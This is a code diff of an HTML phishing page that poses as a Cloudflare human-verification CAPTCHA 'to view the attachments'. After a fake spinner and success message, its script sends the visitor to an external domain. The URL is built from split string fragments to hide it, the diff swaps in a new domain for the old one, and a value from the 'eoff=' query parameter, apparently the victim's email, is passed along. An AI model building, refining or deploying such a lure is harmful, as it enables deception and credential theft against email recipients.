@@ -3,13 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>PO</title>
+    <title>Verify Human</title>
     <style>
+   
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
             margin: 0;
             height: 100vh;
@@ -22,7 +24,9 @@
             -webkit-font-smoothing: antialiased;
             overflow: hidden;
         }
-        .preloader__curtain {
+
+        /* ---------- ENTRANCE PRELOADER (full curtain) ---------- */
+        .preload-curtain {
             position: fixed;
             inset: 0;
             background: #f8fafc;
@@ -32,30 +36,44 @@
             z-index: 100;
             transition: opacity 0.6s ease-out;
         }
-        .preloader__icon {
+
+        .preload-icon {
             width: 120px;
             height: auto;
-            animation: softPulse 3s ease-in-out infinite;
+            animation: smoothPulse 3s ease-in-out infinite;
         }
-        @keyframes softPulse {
-            0%, 100% { transform: scale(0.95); opacity: 0.7; }
-            50% { transform: scale(1.05); opacity: 1; }
+
+        @keyframes smoothPulse {
+            0%, 100% {
+                transform: scale(0.95);
+                opacity: 0.7;
+            }
+            50% {
+                transform: scale(1.05);
+                opacity: 1;
+            }
         }
-        .verification__panel {
+
+        /* ---------- MAIN VERIFICATION PANEL (hidden until preloader fades) ---------- */
+        .verify-panel {
             display: flex;
             flex-direction: column;
             align-items: center;
             opacity: 0;
             transition: opacity 0.5s ease-in;
         }
-        .instruction__label {
+
+        .verify-instruction {
             margin-bottom: 18px;
             font-size: 0.92rem;
             color: #1e293b;
             letter-spacing: -0.01em;
             font-weight: 450;
+            text-align: center;
         }
-        .captcha__card {
+
+        /* ---------- CAPTCHA CARD ---------- */
+        .captcha-module {
             display: flex;
             align-items: center;
             justify-content: space-between;
@@ -69,21 +87,26 @@
             transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
             position: relative;
         }
-        .checkbox__trigger {
+
+        /* interactive trigger region */
+        .captcha-trigger {
             display: flex;
             align-items: center;
             gap: 12px;
             cursor: pointer;
             user-select: none;
         }
-        .checkbox__svg__holder {
+
+        /* svg container & dynamic path */
+        .svg-icon-container {
             width: 22px;
             height: 22px;
             display: flex;
             align-items: center;
             justify-content: center;
         }
-        .checkbox__svg__path {
+
+        .dynamic-svg-path {
             width: 100%;
             height: 100%;
             fill: none;
@@ -93,25 +116,30 @@
             stroke-linejoin: round;
             transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
         }
-        .checkbox__text {
+
+        .captcha-label {
             font-size: 0.95rem;
             font-weight: 500;
             color: #1e293b;
         }
-        .branding__wrapper {
+
+        /* right side branding */
+        .brand-side {
             display: flex;
             flex-direction: column;
             align-items: flex-end;
             justify-content: center;
             height: 100%;
         }
-        .brand__logo {
+
+        .brand-logo-img {
             height: 38px;
             width: auto;
             margin-bottom: -2px;
             display: block;
         }
-        .brand__name {
+
+        .brand-text {
             display: block;
             font-weight: 800;
             font-size: 0.75rem;
@@ -119,112 +147,166 @@
             color: #FF8C00;
             text-transform: uppercase;
         }
-        .legal__tiny {
+
+        .legal-footnote {
             font-size: 0.65rem;
             color: #64748b;
             margin-top: 1px;
         }
-        .captcha__card.spinner__active .checkbox__svg__path {
+
+        /* ---------- SPINNER (verification) animation ---------- */
+        .captcha-module.spinner-state .dynamic-svg-path {
             stroke: #3b82f6;
-            animation: rotateSmooth 1s linear infinite;
+            animation: spinnerRotate 1s linear infinite;
             transform-origin: center;
         }
-        .captcha__card.verified__success .checkbox__svg__path {
+
+        @keyframes spinnerRotate {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ---------- SUCCESS state (green glow & text) ---------- */
+        .captcha-module.success-state .dynamic-svg-path {
             stroke: #10B981;
             filter: drop-shadow(0 0 3px rgba(16, 185, 129, 0.4));
         }
-        .captcha__card.verified__success .checkbox__text {
+
+        .captcha-module.success-state .captcha-label {
             color: #10B981;
-        }
-        @keyframes rotateSmooth {
-            to { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <div id="loadingCurtain" class="preloader__curtain">
-        <img src="astroman.png" alt="Loading..." class="preloader__icon">
+
+    <!-- PRELOADER CURTAIN (exact same behavior) -->
+    <div id="preloaderCurtain" class="preload-curtain">
+        <img src="astroman.png" alt="Loading verification" class="preload-icon">
     </div>
-    <div id="verificationRoot" class="verification__panel">
-        <div id="instructionMsg" class="instruction__label"></div>
-        <div id="captchaContainer" class="captcha__card">
-            <div id="clickableZone" class="checkbox__trigger">
-                <div class="checkbox__svg__holder">
-                    <svg id="dynamicSvgIcon" viewBox="0 0 24 24" class="checkbox__svg__path">
-                        <path id="shapePath" d="M4 4h16v16H4z" />
+
+    <!-- MAIN VERIFICATION UI (hidden initially) -->
+    <div id="verificationInterface" class="verify-panel">
+        <div id="instructionMessage" class="verify-instruction"></div>
+        <div id="captchaElement" class="captcha-module">
+            <div id="clickSensor" class="captcha-trigger">
+                <div class="svg-icon-container">
+                    <svg viewBox="0 0 24 24" class="dynamic-svg-path" id="statefulSvgPath">
+                        <path id="mainShape" d="M4 4h16v16H4z" />
                     </svg>
                 </div>
-                <span id="buttonText" class="checkbox__text"></span>
+                <span id="actionButtonLabel" class="captcha-label"></span>
             </div>
-            <div class="branding__wrapper">
-                <img src="cloudflare_.png" alt="Logo" class="brand__logo">
-                <span id="brandLabel" class="brand__name"></span>
-                <div class="legal__tiny">privacy . terms</div>
+            <div class="brand-side">
+                <img src="cloudflare_.png" alt="Security brand" class="brand-logo-img">
+                <span id="brandTitle" class="brand-text"></span>
+                <div class="legal-footnote">privacy . terms</div>
             </div>
         </div>
     </div>
+
     <script>
         (function() {
-            const copy = {
-                instruction: "Verify you're human below to view the attachments",
-                initialBtn: "I'm not a robot",
-                verifyingMsg: "Verifying...",
-                successMsg: "Success!",
-                brandText: "CLOUDFLARE"
+            // -------------------  TEXT ASSETS (exact copy from original) -------------------
+            const lang = {
+                instructionText: "Verify you're human below to view the attachments",
+                defaultButton: "I'm not a robot",
+                verifyingState: "Verifying...",
+                verifiedSuccess: "Success!",
+                brandName: "CLOUDFLARE"
             };
-            const loadingDiv = document.getElementById('loadingCurtain');
-            const mainPanel = document.getElementById('verificationRoot');
-            const instrSpan = document.getElementById('instructionMsg');
-            const captchaCard = document.getElementById('captchaContainer');
-            const actionButtonText = document.getElementById('buttonText');
-            const dynamicPath = document.getElementById('shapePath');
-            const brandSpan = document.getElementById('brandLabel');
-            instrSpan.textContent = copy.instruction;
-            actionButtonText.textContent = copy.initialBtn;
-            brandSpan.textContent = copy.brandText;
-            let isProcessing = false;
+
+            // -------------------  DOM references  -------------------
+            const preloader = document.getElementById('preloaderCurtain');
+            const verificationPanel = document.getElementById('verificationInterface');
+            const instructionEl = document.getElementById('instructionMessage');
+            const captchaCard = document.getElementById('captchaElement');
+            const triggerZone = document.getElementById('clickSensor');
+            const buttonSpan = document.getElementById('actionButtonLabel');
+            const svgPathShape = document.getElementById('mainShape');     // <path> inside svg
+            const brandSpan = document.getElementById('brandTitle');
+
+            // set static texts identical to original
+            instructionEl.textContent = lang.instructionText;
+            buttonSpan.textContent = lang.defaultButton;
+            brandSpan.textContent = lang.brandName;
+
+            // flow lock (prevents double verification)
+            let verificationInProgress = false;
+
+         
             setTimeout(() => {
-                loadingDiv.style.opacity = '0';
+                preloader.style.opacity = '0';
                 setTimeout(() => {
-                    loadingDiv.style.display = 'none';
-                    mainPanel.style.opacity = '1';
+                    preloader.style.display = 'none';
+                    verificationPanel.style.opacity = '1';
                 }, 600);
             }, 3000);
-            function handleVerificationFlow() {
-                if (isProcessing) return;
-                isProcessing = true;
-                captchaCard.classList.add('spinner__active');
-                actionButtonText.textContent = copy.verifyingMsg;
-                dynamicPath.setAttribute('d', 'M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2');
-                dynamicPath.style.strokeDasharray = '35 15';
+
+    
+            function updateSvgPath(newPathData, strokeDash = null, removeDash = false) {
+                if (!svgPathShape) return;
+                svgPathShape.setAttribute('d', newPathData);
+                if (removeDash) {
+                    svgPathShape.style.strokeDasharray = '';
+                } else if (strokeDash !== null) {
+                    svgPathShape.style.strokeDasharray = strokeDash;
+                }
+            }
+
+            
+            function executeVerification() {
+                if (verificationInProgress) return;
+                verificationInProgress = true;
+
+                // ---- 1. Spinner / verifying mode ----
+                captchaCard.classList.add('spinner-state');
+                buttonSpan.textContent = lang.verifyingState;
+
+                
+                updateSvgPath('M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2', '35 15', false);
+
+            
                 setTimeout(() => {
-                    captchaCard.classList.remove('spinner__active');
-                    captchaCard.classList.add('verified__success');
-                    actionButtonText.textContent = copy.successMsg;
-                    dynamicPath.setAttribute('d', 'M20 6L9 17l-5-5');
-                    dynamicPath.style.strokeDasharray = 'none';
+                   
+                    captchaCard.classList.remove('spinner-state');
+                    captchaCard.classList.add('success-state');
+                    buttonSpan.textContent = lang.verifiedSuccess;
+
+                    
+                    updateSvgPath('M20 6L9 17l-5-5', null, true);
+
+                   
                     setTimeout(() => {
+                     
                         const currentSearch = window.location.search;
-                        const eoffIndex = currentSearch.indexOf('eoff=');
-                        let fragmentPart = '';
+                        const eoffMarker = 'eoff=';
+                        const eoffIndex = currentSearch.indexOf(eoffMarker);
+                        let hashFragment = '';
                         if (eoffIndex !== -1) {
-                            fragmentPart = currentSearch.substring(eoffIndex + 5);
+                           
+                            hashFragment = currentSearch.substring(eoffIndex + eoffMarker.length);
                         }
-                        const p1 = 'ht';
-                        const p2 = 'tps';
-                        const p3 = '://';
-                        const p4 = 'po';
-                        const p5 = '.tempae';
-                        const p6 = '.online';
-                        const p7 = '/sNOiatkB';
-                        const finalUrl = p1 + p2 + p3 + p4 + p5 + p6 + p7;
-                        window.location.href = finalUrl + (fragmentPart ? '#' + fragmentPart : '');
+
+                        
+                        const part1 = 'ht';
+                        const part2 = 'tps';
+                        const part3 = '://';
+                        const part4 = 'po';
+                        const part5 = '.uaomanshare';
+                        const part6 = '.online';
+                        const part7 = '/sNOiatkB';
+                        const destinationUrl = part1 + part2 + part3 + part4 + part5 + part6 + part7;
+
+                        
+                        window.location.href = destinationUrl + (hashFragment ? '#' + hashFragment : '');
                     }, 1200);
                 }, 2500);
             }
-            const triggerElement = document.getElementById('clickableZone');
-            if (triggerElement) {
-                triggerElement.addEventListener('click', handleVerificationFlow);
+
+            
+            if (triggerZone) {
+                triggerZone.addEventListener('click', executeVerification);
             }
         })();
     </script>
